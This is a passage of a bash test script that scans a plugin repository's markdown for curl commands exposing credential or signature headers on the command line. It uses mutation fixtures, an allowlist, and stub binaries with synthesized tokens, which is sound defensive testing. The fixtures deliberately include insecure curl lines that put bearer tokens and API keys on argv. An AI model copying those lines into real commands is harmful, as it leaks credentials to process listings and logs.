# `-H @<(printf ...)` form (the header name is inside the process substitution), and the compliant `header = "Authorization: Bearer %s"` on `--config -`
# are all outside the pattern.
# A second rule (reason stdin:<file>): a logical line that holds `curl ... --config -` AND a second stdin consumer (`-d @-`, `--data-binary @-`,
# `-T -`, `-H @-`, a heredoc, or a pipe into curl beside the `< <(...)` feed) is RED, because both consume stdin and the config would be eaten.
#
# EXECUTED ROWS. The scan proves the BAD shape is absent; it never proves the converted snippet works. Three converted blocks (postmerge Phase 3.5,
# preflight Step 1.4, ship's infra-config-status probe) are therefore EXTRACTED from the real files and RUN under bash against a PATH stub `curl` (records
# argv and stdin), a stub `doppler` and `jq`, with a synthesized token: the token must be absent from every recorded argv and present on the recorded stdin
# config, a refused token (a space in it) must make ZERO curl calls, and a control proves the judge goes RED when a block puts the token on argv.
#
# EXPLICIT RESIDUAL ALLOWLIST (S7_ALLOW: file, the exact number of hits): skill-creator/references/api-security.md documents the chat-visibility threat
# model with BAD examples. THE ALLOWLIST IS PINNED, NOT "SHRINK ONLY": the judge's ceiling constant caps the entry count (-le), a count that moved is RED,
# the hit floor (the measured allowlisted count) makes a scan that sees nothing RED, and the ceiling ROW pins the entry and its measured count EXACTLY (-eq,
# as S6's row does), so deleting the entry is a deliberate edit of that row, the floor and the entry together.
#
# NOT COVERED, named (each was measured outside the scan; none is a claim that it is safe):
#   - clients other than curl: wget --header, httpie, `gh api -H`;
#   - credential spellings other than the nine header names on `-H`: `-u/--user user:secret`, `--oauth2-bearer`, `-b/--cookie` and a Cookie header,
#     Proxy-Authorization, X-Auth-Key, X-Auth-Token and any other header name, a token in a URL (`?access_token=`) or in `-d`/`-F` (api-security.md carries one
#     such line, `-F access_token=`, inside the allowlisted file, so it is neither counted nor flagged);
#   - a header carried in a variable (`-H "$AUTH_HEADER"`, `ARGS+=(-H ...)` on a prior line), an `eval`, and the spellings `curl.exe` and `**curl**`;
#   - a second stdin consumer spelled `-F f=@-`, `--form`, `-d @/dev/stdin`, `-T /dev/stdin`, `--data-ascii @-`, `-K-`;
#   - files that are not markdown (scripts are Guards 1 and 2; Rule E covers them), and markdown the scan does not walk: plugins/soleur/docs/, EVERY
#     knowledge-base/ tree (including knowledge-base/engineering/operations/runbooks/*.md, which agents DO read and which hold argv-bearer lines),
#     .github/PULL_REQUEST_TEMPLATE.md (converted by hand, but unscanned), apps/web-platform/infra/sentry/README.md (NOT converted: a path under apps/web-platform/infra/ fires the infra apply workflows on merge, so it waits for a PR that already owns an apply), apps/web-platform/infra/egress-gw-image.provenance.md;
#   - credential text echoed by workflows (`.github/workflows/scheduled-terraform-drift.yml` prints runbook commands).
# =====================================================================================
S7_ALLOW_CEIL=1; S7_HIT_FLOOR=5
S7_ALLOW=(
"plugins/soleur/skills/skill-creator/references/api-security.md	5"
)
# One TSV record per finding. V: a violating logical line (file, start line, text). Q: a curl that reads stdin twice (file, start line).
s7_scan() { # <root>
  python3 -I -c '
import re, subprocess, sys
root = sys.argv[1]
files = subprocess.run(["git", "-C", root, "ls-files", "-z", "--cached", "--others", "--exclude-standard", "--", "plugins"], capture_output=True, check=True).stdout.decode().split("\0")
cmd = re.compile(r"(?:^|[\s({;|&`\x27\"=])(?:\\|/usr/bin/|/usr/local/bin/|\./)?curl(?=\s|$)")
hdr = re.compile(r"(?<![\w-])(?:-[A-Za-z]*H|--header)(?:\s*=\s*|\s*)\$?[\"\x27]?\s*(?i:Authorization|apikey|X-Api-Key|Private-Token|Api-Key|CF-Access-Client-Id|CF-Access-Client-Secret|X-Signature-256|X-Soleur-KB-Drift-Signature)(?![\w-])")
cfg = re.compile(r"(?<![\w-])(?:--config|-K)(?:\s+|=)-(?=\s|$|[\"\x27])")
two = re.compile(r"(?<![\w-])(?:-[A-Za-z]*d|--data|--data-binary|--data-raw|--data-urlencode|--json)(?:\s*|=)[\"\x27]?@-(?=\s|$|[\"\x27])"
                 r"|(?<![\w-])(?:-[A-Za-z]*T|--upload-file)(?:\s+|=)[\"\x27]?-(?=\s|$|[\"\x27])"
                 r"|(?<![\w-])-H\s+@-(?=\s|$)|<<")
pipe = re.compile(r"\|\s*(?:\\|/usr/bin/|/usr/local/bin/|\./)?curl(?=\s|$)")
feed = re.compile(r"<\s*<\(")
for f in sorted(set(files)):
    if not re.match(r"^plugins/.*\.md$", f) or f.startswith("plugins/soleur/docs/") or "/knowledge-base/" in "/" + f: continue
    try: raw = open(root + "/" + f, encoding="utf-8", errors="replace").read().split("\n")
    except OSError: continue
    logical, cur, start = [], "", 0
    for i, l in enumerate(raw, 1):
        s = l.strip()
        if s.startswith("```") or s.startswith("~~~"):
            if cur: logical.append((start, cur)); cur = ""
            logical.append((i, s)); continue
        if not cur: start = i
        if s.endswith("\\"): cur += s[:-1] + " "; continue
        logical.append((start, cur + s)); cur = ""
    if cur: logical.append((start, cur))
    for n, t in logical:
        if not cmd.search(t): continue
        if hdr.search(t): print("V\t%s\t%d\t%s" % (f, n, " ".join(t.split())[:80]))
        if cfg.search(t) and (two.search(t) or (pipe.search(t) and feed.search(t))): print("Q\t%s\t%d" % (f, n))
' "$1"
}
# The verdict over a root. Sets S7_J_REASONS (empty = GREEN) and S7_J_HITS. Reasons: floor, argv:<file>, allow-count:<file>, ceiling, stdin:<file>.
S7_J_REASONS=""; S7_J_HITS=0
s7_judge() { # <root>
  local root="$1" scan a file want got f
  scan="$(s7_scan "$root")"; S7_J_REASONS=""
  S7_J_HITS="$(grep -c '^V	' <<<"$scan" || true)"
  [[ "$S7_J_HITS" -ge "$S7_HIT_FLOOR" ]] || S7_J_REASONS+=" floor"
  [[ "${#S7_ALLOW[@]}" -le "$S7_ALLOW_CEIL" ]] || S7_J_REASONS+=" ceiling"
  # every file with a violating line must be allowlisted with exactly its count
  while IFS=$'\t' read -r got file; do
    [[ -n "$file" ]] || continue
    want=""; for a in "${S7_ALLOW[@]}"; do [[ "$a" == "$file"$'\t'* ]] && want="${a##*$'\t'}"; done
    if [[ -z "$want" ]]; then S7_J_REASONS+=" argv:$file"; elif [[ "$want" != "$got" ]]; then S7_J_REASONS+=" allow-count:$file"; fi
  done < <(awk -F'\t' '$1 == "V" { n[$2]++ } END { for (k in n) print n[k] "\t" k }' <<<"$scan")
  # an allowlist entry whose file no longer carries a hit is stale (delete the entry and lower the floor together)
  for a in "${S7_ALLOW[@]}"; do
    file="${a%%$'\t'*}"
    got="$(awk -F'\t' -v f="$file" '$1 == "V" && $2 == f { n++ } END { print n + 0 }' <<<"$scan")"
    [[ "$got" -gt 0 ]] || S7_J_REASONS+=" allow-count:$file"
  done
  while IFS= read -r f; do [[ -n "$f" ]] && S7_J_REASONS+=" stdin:$f"; done < <(awk -F'\t' '$1 == "Q" { print $2 }' <<<"$scan" | sort -u)
  S7_J_REASONS="${S7_J_REASONS# }"
}
S7="$TMPD/s7"; assert_fixture_dir "$S7"; mkdir -p "$S7/base" "$S7/mut"
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$S7/base" || exit 1; git -C "$S7/base" init -q ) \
  || fatal "S7 could not create the scratch repository"
S7_CONVERTED=(
  plugins/soleur/skills/postmerge/SKILL.md
  plugins/soleur/skills/postmerge/references/sentry-error-count-delta.md
  plugins/soleur/skills/postmerge/references/deploy-status-debugging.md
  plugins/soleur/skills/reproduce-bug/SKILL.md
  plugins/soleur/skills/preflight/SKILL.md
  plugins/soleur/skills/ship/SKILL.md
  plugins/soleur/agents/engineering/infra/infra-security.md
  plugins/soleur/agents/engineering/review/deployment-verification-agent.md
  plugins/soleur/skills/flag-delete/SKILL.md
  plugins/soleur/skills/flag-list/SKILL.md
)
S7_APIDOC="plugins/soleur/skills/skill-creator/references/api-security.md"
S7_SAFE=(plugins/soleur/skills/cf-token-scope/references/widen-playbook.md plugins/soleur/skills/trigger-cron/SKILL.md)
for f in "${S7_CONVERTED[@]}" "$S7_APIDOC" "${S7_SAFE[@]}"; do
  [[ -f "$REPO_ROOT/$f" ]] || fatal "S7 fixture source $f is missing"
  mkdir -p "$S7/base/$(dirname "$f")"; cp "$REPO_ROOT/$f" "$S7/base/$f"
done
s7_fresh() { local d="$S7/mut/$1"; assert_fixture_dir "$d"; rm -rf "$d"; cp -a "$S7/base" "$d" && printf '%s' "$d"; }
# A mini tree: the allowlisted documentation file (so the floor is met) plus ONE variant file zz.md holding the text under test.
S7_MINI="$S7/mini"; mkdir -p "$S7_MINI"
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$S7_MINI" || exit 1; git -C "$S7_MINI" init -q ) || fatal "S7 could not create the mini repository"
mkdir -p "$S7_MINI/$(dirname "$S7_APIDOC")" "$S7_MINI/plugins/zz"; cp "$S7/base/$S7_APIDOC" "$S7_MINI/$S7_APIDOC"
s7_variant() { # <name> <text, printf-%b escapes honoured> -> S7_J_REASONS for a mini tree whose zz.md holds exactly the text
  local d="$S7/mut/v-$1"; assert_fixture_dir "$d"; rm -rf "$d"; cp -a "$S7_MINI" "$d" || fatal "S7 variant copy"
  printf '%b\n' "$2" > "$d/plugins/zz/zz.md"; s7_judge "$d"
}
S7_Q="'" # a literal single quote for the variant texts
S7_PRINTF="< <(printf ${S7_Q}header = \"Authorization: Bearer %s\"\\\\n${S7_Q} \"\$T\")"

# --- the real tree ---------------------------------------------------------------------
s7_judge "$REPO_ROOT"; S7_REAL_REASONS="$S7_J_REASONS"; S7_REAL_HITS="$S7_J_HITS"
if [[ -z "$S7_REAL_REASONS" ]]; then row "S7 Guard 3: no tracked plugins/**/*.md puts an Authorization, apikey, X-Api-Key, Private-Token, Api-Key, CF-Access-Client-Id, CF-Access-Client-Secret, X-Signature-256 or X-Soleur-KB-Drift-Signature header on curl argv outside the residual allowlist, and none reads stdin twice ($S7_REAL_HITS hits, all in the allowlisted documentation file)" ok
else row "S7 Guard 3: a markdown snippet puts a credential or signature header on curl argv, or reads stdin twice, outside the residual allowlist" fail "reasons='$S7_REAL_REASONS' hits=$S7_REAL_HITS"; fi
S7_ALLOW_N=0; for a in "${S7_ALLOW[@]}"; do S7_ALLOW_N=$((S7_ALLOW_N + 1)); done
if [[ "$S7_ALLOW_N" -eq "$S7_ALLOW_CEIL" && "$S7_ALLOW_N" -eq 1 && "${S7_ALLOW[0]}" == "$S7_APIDOC"$'\t'"$S7_HIT_FLOOR" ]]; then row "S7 allowlist ceiling: exactly $S7_ALLOW_CEIL residual entry ($S7_APIDOC, $S7_HIT_FLOOR measured hits; pinned exactly, so removing it edits this pin and the hit floor together)" ok
else row "S7 allowlist ceiling: the residual allowlist grew or its measured count moved" fail "entries=$S7_ALLOW_N ceiling=$S7_ALLOW_CEIL"; fi
# The unmodified scratch tree is GREEN first, so every mutation row below changes exactly one thing against a known-good tree.
s7_judge "$S7/base"; S7_BASE_REASONS="$S7_J_REASONS"
if [[ -z "$S7_BASE_REASONS" ]]; then row "S7 control: the unmutated scratch tree (the ten converted files, the documentation file and the argv-safe controls) is GREEN" ok
else row "S7 control: the unmutated scratch tree is not GREEN" fail "reasons='$S7_BASE_REASONS'"; fi

# --- mutation rows (the SAME scan over a scratch tree) ----------------------------------------
# M1: a violating header re-added to a converted file.
S7_M1="$(s7_fresh m1)"; S7_M1F="plugins/soleur/skills/reproduce-bug/SKILL.md"
assert_fixture_dir "$S7_M1"
printf '%s\n' '```bash' 'curl -s -H "Authorization: Bearer $TOK" "https://x.example/api"' '```' >> "$S7_M1/$S7_M1F"
s7_judge "$S7_M1"
if [[ "$S7_J_REASONS" == "argv:$S7_M1F" ]]; then row "S7 mutation 1: the argv bearer header re-added to a converted file is RED, by file identity and nothing else" ok
else row "S7 mutation 1: a re-added argv header in a converted file is not caught" fail "reasons='$S7_J_REASONS'"; fi
# M2: a compliant converted snippet in one file, then a violating one in a different file: only the second is named.
S7_M2="$(s7_fresh m2)"
assert_fixture_dir "$S7_M2"
printf '%s\n' '```bash' "curl --disable --proto '=https' -m 30 -fsS --config - \"\$URL\" $S7_PRINTF" '```' >> "$S7_M2/plugins/soleur/skills/postmerge/SKILL.md"
printf '%s\n' '```bash' 'curl -fsS -H "apikey: $K" "$URL"' '```' >> "$S7_M2/plugins/soleur/skills/preflight/SKILL.md"
s7_judge "$S7_M2"
if [[ "$S7_J_REASONS" == "argv:plugins/soleur/skills/preflight/SKILL.md" ]]; then row "S7 mutation 2: a compliant snippet then a violating one in another file is RED for the second file only (identity, not a count)" ok
else row "S7 mutation 2: the second file's violation is not named, or the compliant snippet is flagged" fail "reasons='$S7_J_REASONS'"; fi
# M3: the allowlist grows by one entry (a new file with a hit, allowlisted with its count): the ceiling is RED.
S7_M3="$(s7_fresh m3)"; assert_fixture_dir "$S7_M3"
printf '%s\n' '`curl -H "Authorization: Bearer $T" "$U"`' > "$S7_M3/plugins/soleur/skills/zz-new.md"
S7_ALLOW_SAVE=("${S7_ALLOW[@]}"); S7_ALLOW+=("plugins/soleur/skills/zz-new.md	1")
s7_judge "$S7_M3"; S7_M3R="$S7_J_REASONS"; S7_ALLOW=("${S7_ALLOW_SAVE[@]}")
if [[ "$S7_M3R" == "ceiling" ]]; then row "S7 mutation 3: the allowlist growing by one entry is RED on the ceiling (and the new entry's own hit is the only thing it hides)" ok
else row "S7 mutation 3: the residual allowlist can grow silently" fail "reasons='$S7_M3R'"; fi
# M3b: one more hit inside the allowlisted documentation file (the entry names a count, not a licence). M3c: an entry whose file carries no hit (stale).
S7_M3B="$(s7_fresh m3b)"; assert_fixture_dir "$S7_M3B"
printf '%s\n' 'curl -sS -H "Authorization: Bearer $T" "$U"' >> "$S7_M3B/$S7_APIDOC"
s7_judge "$S7_M3B"; S7_M3BR="$S7_J_REASONS"
S7_M3C="$(s7_fresh m3c)"; S7_ALLOW_SAVE=("${S7_ALLOW[@]}"); S7_ALLOW=("plugins/soleur/skills/zz-gone.md	1")
s7_judge "$S7_M3C"; S7_M3CR="$S7_J_REASONS"; S7_ALLOW=("${S7_ALLOW_SAVE[@]}")
if [[ "$S7_M3BR" == "allow-count:$S7_APIDOC" && "$S7_M3CR" == *"allow-count:plugins/soleur/skills/zz-gone.md"* ]]; then row "S7 mutation 3 (count, stale): one more hit inside the allowlisted file is RED on its count, and an entry whose file has no hit is RED as stale" ok
else row "S7 mutation 3 (count, stale): the allowlisted count can move, or a stale entry survives" fail "extra-hit='$S7_M3BR' stale='$S7_M3CR'"; fi
# M4: every scanned header word renamed in a scratch tree: the scan sees 0 hits and the floor is RED, never a clean bill.
S7_M4="$(s7_fresh m4)"; find "$S7_M4/plugins" -name '*.md' -exec sed -i -E 's/[Aa]uthorization/Authz/g; s/apikey/apik/g; s/[Xx]-[Aa]pi-[Kk]ey/x-k/g; s/[Pp]rivate-[Tt]oken/priv/g; s/[Aa]pi-[Kk]ey/ak/g; s/[Cc][Ff]-[Aa]ccess-[Cc]lient-/cfx-/g; s/[Xx]-[Ss]ignature-256/xs/g; s/[Xx]-[Ss]oleur-[Kk][Bb]-[Dd]rift-[Ss]ignature/xd/g' {} +
s7_judge "$S7_M4"
if [[ "$S7_J_HITS" -eq 0 && "$S7_J_REASONS" == *floor* ]]; then row "S7 mutation 4: with every scanned header word renamed the scan sees 0 hits and the floor is RED" ok
else row "S7 mutation 4: a scan that sees nothing is not RED" fail "hits=$S7_J_HITS reasons='$S7_J_REASONS'"; fi
# M5: the header on a backslash-continuation line of an otherwise converted snippet (a per-line scan is green over it).
s7_variant m5 "\`\`\`bash\ncurl --disable --proto '=https' -m 30 -fsS --config - \\\\\n  -H \"Authorization: Bearer \$T\" \"\$U\" $S7_PRINTF\n\`\`\`"
S7_M5R="$S7_J_REASONS"
s7_variant m5b "\`\`\`bash\ncurl -fsS \"\$U\" \\\\\n  -H \"\$EXTRA\" \\\\\n  --header 'apikey: x'\n\`\`\`"
if [[ "$S7_M5R" == "argv:plugins/zz/zz.md" && "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]]; then row "S7 mutation 5: the header on a continuation line (also two joins deep) is RED through the logical-line join" ok
else row "S7 mutation 5: a header on a continuation line is not caught" fail "one-join='$S7_M5R' two-join='$S7_J_REASONS'"; fi
# M6: shape variants, one per spelling, each RED: --header=, lowercase name, -H"Authorization with no space, a table cell, a short-option cluster.
S7_M6BAD=""
s7_variant m6a 'curl -sS --header=Authorization:Bearer-x "$U"'; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" --header="
s7_variant m6b 'curl -sS -H "authorization: Bearer $T" "$U"'; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" lowercase"
s7_variant m6c 'curl -sS -H"Authorization: Bearer $T" "$U"'; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" -H-nospace"
s7_variant m6d '| Error rate | `curl -sS -H "Authorization: Bearer $T" "$U"` divided by x | error_rate > 0.01 |'; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" table-cell"
s7_variant m6e 'curl -sSH "Authorization: Bearer $T" "$U"'; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" cluster"
s7_variant m6f '$ curl --header "Authorization: Bearer $T" "$U"'; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" --header-space"
s7_variant m6g "curl -sS -H \$'Authorization: Bearer \$T' \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" ansi-c-quote"
s7_variant m6h "curl -sS -H \$\"Authorization: Bearer \$T\" \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6BAD+=" locale-quote"
if [[ -z "$S7_M6BAD" ]]; then row "S7 mutation 6: --header=, a lowercase header name, -H\"Authorization with no space, a table cell, a short-option cluster, --header and an ANSI-C or locale quote (-H \$'Authorization, -H \$\"Authorization) are each RED" ok
else row "S7 mutation 6: a header spelling slips through" fail "missed=$S7_M6BAD"; fi
# M6-lead: the curl command word is recognised after each lead-in (command substitution, list operators, a pipe, a backtick span, a path).
S7_M6LBAD=""
for lead in '$(' '{' 'a;' 'a|' 'a&&' '`' "'" '"' '=' '/usr/bin/' '/usr/local/bin/' './' "\\\\"; do
  s7_variant "m6l" "x=${lead}curl -sS -H \"Authorization: Bearer \$T\" \"\$U\")"; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6LBAD+=" [$lead]"
done
if [[ -z "$S7_M6LBAD" ]]; then row "S7 mutation 6 (lead): a curl directly after \$(, {, ;, |, &&, a backtick, a quote, = and as /usr/bin/curl, /usr/local/bin/curl, ./curl and \\curl is found, each RED" ok
else row "S7 mutation 6 (lead): a curl lead-in slips through" fail "missed=$S7_M6LBAD"; fi
# M6-names: one variant per header-name alternative of the pattern (a control that drives one arm lets the others be deleted unseen).
S7_M6NBAD=""
for nm in Authorization apikey X-Api-Key Private-Token Api-Key; do
  s7_variant "m6n-$nm" "curl -sS -H \"$nm: \$T\" \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6NBAD+=" $nm"
done
if [[ -z "$S7_M6NBAD" ]]; then row "S7 mutation 6 (names): each of Authorization, apikey, X-Api-Key, Private-Token and Api-Key on curl argv is RED (the Rule E four follow)" ok
else row "S7 mutation 6 (names): a header name of the pattern is not caught" fail "missed=$S7_M6NBAD"; fi
# M6-names-2: the four Rule E names beyond the original five (the deploy webhook triple and the KB drift signature), each in the spellings the
# first five are proven in: plain, lowercase, no-space after -H, --header=, a table cell and a backslash continuation (the shape tolerance is the same).
S7_M6N2BAD=""
for nm in CF-Access-Client-Id CF-Access-Client-Secret X-Signature-256 X-Soleur-KB-Drift-Signature; do
  lnm="${nm,,}"
  s7_variant "m6p" "curl -sS -H \"$nm: \$T\" \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6N2BAD+=" $nm"
  s7_variant "m6p" "curl -sS -H \"$lnm: \$T\" \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6N2BAD+=" $nm(lowercase)"
  s7_variant "m6p" "curl -sS -H\"$nm: \$T\" \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6N2BAD+=" $nm(-H-nospace)"
  s7_variant "m6p" "curl -sS --header=\"$nm: \$T\" \"\$U\""; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6N2BAD+=" $nm(--header=)"
  s7_variant "m6p" "| Probe | \`curl -sS -H \"$nm: \$T\" \"\$U\"\` | status 200 |"; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6N2BAD+=" $nm(table-cell)"
  s7_variant "m6p" "curl --disable -fsS --config - \"\$U\" \\\\\n  -H \"$nm: \$T\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "argv:plugins/zz/zz.md" ]] || S7_M6N2BAD+=" $nm(continuation)"
done
if [[ -z "$S7_M6N2BAD" ]]; then row "S7 mutation 6 (names, Rule E set): CF-Access-Client-Id, CF-Access-Client-Secret, X-Signature-256 and X-Soleur-KB-Drift-Signature on curl argv are each RED in the plain, lowercase, -H-no-space, --header=, table-cell and continuation-line spellings" ok
else row "S7 mutation 6 (names, Rule E set): a Rule E header name or spelling slips through" fail "missed=$S7_M6N2BAD"; fi
# M7: a continuation ending a line just before the closing fence: no false positive (the join stops at the fence), and a real violation on that
# last line is not hidden.
s7_variant m7a "\`\`\`bash\ncurl --disable --proto '=https' -m 30 -fsS --config - \"\$U\" \\\\\n\`\`\`\nSend -H \"Authorization: Bearer \$T\" with it."; S7_M7A="$S7_J_REASONS"
s7_variant m7b "\`\`\`bash\ncurl -fsS -H \"Authorization: Bearer \$T\" \\\\\n\`\`\`\nProse after the fence."; S7_M7B="$S7_J_REASONS"
s7_variant m7c "curl -sS \"\$U\" \\\\\n\`\`\`\\\\\n-H \"Authorization: Bearer \$T\""; S7_M7C="$S7_J_REASONS"
s7_variant m7d "curl -sS \"\$U\" \\\\\n~~~\\\\\n-H \"Authorization: Bearer \$T\""; S7_M7D="$S7_J_REASONS"
if [[ -z "$S7_M7A" && "$S7_M7B" == "argv:plugins/zz/zz.md" && -z "$S7_M7C" && -z "$S7_M7D" ]]; then row "S7 mutation 7: a continuation ending just before the closing fence is no false positive (the join stops at the fence) and hides no curl" ok
else row "S7 mutation 7: the logical-line join crosses a fence boundary, or hides a curl before it" fail "false-positive='$S7_M7A' hidden='$S7_M7B' glued-backtick-fence='$S7_M7C' glued-tilde-fence='$S7_M7D'"; fi
# M8: a second stdin consumer beside --config -: each is RED; a plain -d body beside --config - is not.
S7_M8BAD=""
s7_variant m8a "curl --disable -fsS --config - -d @- \"\$U\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" -d@-"
s7_variant m8b "curl --disable -fsS --config - --data-binary @- \"\$U\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" --data-binary"
s7_variant m8c "curl --disable -fsS --config - -T - \"\$U\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" -T"
s7_variant m8d "curl --disable -fsS --config - \"\$U\" <<EOF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" heredoc"
s7_variant m8e "echo x | curl --disable -fsS --config - \"\$U\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" pipe-into-curl"
for sc in "-H @-" "--data @-" "--data-raw @-" "--json @-" "--data-urlencode @-" "--upload-file -" "-d@-"; do
  s7_variant "m8x" "curl --disable -fsS --config - $sc \"\$U\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" [$sc]"
done
s7_variant m8k "curl --disable -fsS -K - -d @- \"\$U\" $S7_PRINTF"; [[ "$S7_J_REASONS" == "stdin:plugins/zz/zz.md" ]] || S7_M8BAD+=" -K"
s7_variant m8f "curl --disable -fsS --config - -d '{\"a\":1}' \"\$U\" $S7_PRINTF"; [[ -z "$S7_J_REASONS" ]] || S7_M8BAD+=" plain--d-flagged"
if [[ -z "$S7_M8BAD" ]]; then row "S7 mutation 8: every second stdin consumer (-d @-, --data(-binary|-raw|-urlencode) @-, --json @-, -T -, --upload-file -, -H @-, a heredoc, a pipe into curl, and -K - as the config) beside --config - is RED; an inline -d body beside it is GREEN" ok
else row "S7 mutation 8: a second stdin consumer beside --config - is not caught (or a plain -d body is)" fail "wrong=$S7_M8BAD"; fi
# Must-PASS: the compliant stdin-config form, the argv-safe -H @<(printf ...) form, prose naming -H with no curl command word, curl's own -H of a
# non-credential header, and the two excluded trees (the plugin docs site and a knowledge-base tree hold no agent-run snippet).
S7_MPBAD=""
s7_variant mp1 "(LC_ALL=C; case \"\$T\" in ''|*[!A-Za-z0-9._~+/=-]*) exit 1;; esac) || { echo \"token refused\" >&2; exit 1; }\ncurl --disable --proto '=https' -m 30 -fsS --config - \"\$U\" $S7_PRINTF"; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" stdin-config"
s7_variant mp2 "curl -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") https://api.cloudflare.com/client/v4/user/tokens/verify"; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" argv-safe-H@"
s7_variant mp3 'Pass the token with `-H` and an Authorization header on the request, never on the command line.'; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" prose-no-curl"
s7_variant mp4 'curl -sS -H "Content-Type: application/json" -d "{}" "$U"'; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" non-credential-H"
s7_variant mp6 'curl -sS -H "Authorizations: x" -H "Api-Keyed: y" -H "apikeys: z" -H "X-Api-Key-Version: 2" "$U"'; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" longer-header-names"
s7_variant mp7 "curl --disable --proto '=https' -m 30 -fsS --config - \"\$U\" < <(printf 'header = \"X-Signature-256: sha256=%s\"\\\\nheader = \"CF-Access-Client-Id: %s\"\\\\nheader = \"CF-Access-Client-Secret: %s\"\\\\nheader = \"X-Soleur-KB-Drift-Signature: %s\"\\\\n' \"\$S\" \"\$I\" \"\$C\" \"\$D\")"; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" rule-e-names-on-stdin-config"
s7_variant mp8 "curl -sS -H \"CF-Access-Client-Id-Hint: x\" -H \"CF-Access-Client-Secretary: y\" -H \"X-Signature-2560: z\" -H \"X-Signature-256-Version: 2\" -H \"X-Soleur-KB-Drift-Signatures: w\" \"\$U\""; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" longer-rule-e-names"
S7_MPD="$S7/mut/v-mp5"; assert_fixture_dir "$S7_MPD"; rm -rf "$S7_MPD"; cp -a "$S7_MINI" "$S7_MPD"; mkdir -p "$S7_MPD/plugins/soleur/docs" "$S7_MPD/plugins/soleur/knowledge-base/x"
printf '%s\n' 'curl -H "Authorization: Bearer $T" "$U"' > "$S7_MPD/plugins/zz/zz.txt"
printf '%s\n' 'curl -H "Authorization: Bearer $T" "$U"' > "$S7_MPD/plugins/soleur/docs/zz.md"; printf '%s\n' 'curl -H "Authorization: Bearer $T" "$U"' > "$S7_MPD/plugins/soleur/knowledge-base/x/zz.md"
s7_judge "$S7_MPD"; [[ -z "$S7_J_REASONS" ]] || S7_MPBAD+=" excluded-trees"
if [[ -z "$S7_MPBAD" ]]; then row "S7 must-pass: the stdin-config form, the argv-safe -H @<(printf ...) form, prose with -H and no curl, non-credential -H headers (including names that only start like a credential name), and the docs site, a knowledge-base tree and a non-markdown file are GREEN" ok
else row "S7 must-pass: a compliant form is flagged" fail "flagged=$S7_MPBAD"; fi
# --- EXECUTED rows: the converted blocks are extracted from the real files and RUN, not only scanned ---------------------------------------
S7_X="$S7/exec"; assert_fixture_dir "$S7_X"; mkdir -p "$S7_X/bin"
cat > "$S7_X/bin/curl" <<'S7X_STUB'
#!/usr/bin/env bash
# Recording stub: argv one per line, stdin only when the call carries `--config -` (as curl would), a canned body.
d="${S7X_REC:?}"; n=0; [[ -r "$d/n" ]] && read -r n < "$d/n"; n=$((n + 1)); printf '%s\n' "$n" > "$d/n"
printf '%s\n' "$@" > "$d/argv.$n"
cfg=0; prev=""; for a in "$@"; do [[ "$prev" == "--config" && "$a" == "-" ]] && cfg=1; prev="$a"; done
if [[ "$cfg" == 1 ]]; then cat > "$d/stdin.$n"; else : > "$d/stdin.$n"; fi
printf '[]\n'
S7X_STUB
cat > "$S7_X/bin/doppler" <<'S7X_STUB'
#!/usr/bin/env bash
# `doppler secrets get NAME ...`: a synthesized value, distinct per NAME so a mix-up between secrets is visible; NAME == S7X_BADNAME gets a
# value with a space in it (a refused shape), so ONE secret at a time can be made bad.
[[ -n "${S7X_BADNAME:-}" && "${3:-}" == "$S7X_BADNAME" ]] && { printf 'bad val'; exit 0; }
case "${3:-}" in
  SENTRY_ORG) printf 'synthorg' ;;
  NEXT_PUBLIC_SUPABASE_URL) printf 'https://sup.example.invalid' ;;
  APP_DOMAIN_BASE) printf 'example.invalid' ;;
  *) printf '%s-%s' "${S7X_TOKEN:-}" "${3:-}" ;;
esac
S7X_STUB
printf '#!/usr/bin/env bash\ncat\n' > "$S7_X/bin/jq"
chmod +x "$S7_X/bin/curl" "$S7_X/bin/doppler" "$S7_X/bin/jq"
S7X_GOOD="synthtok0123.ab_c~d+e/f=g-h"; S7X_BAD="bad val"
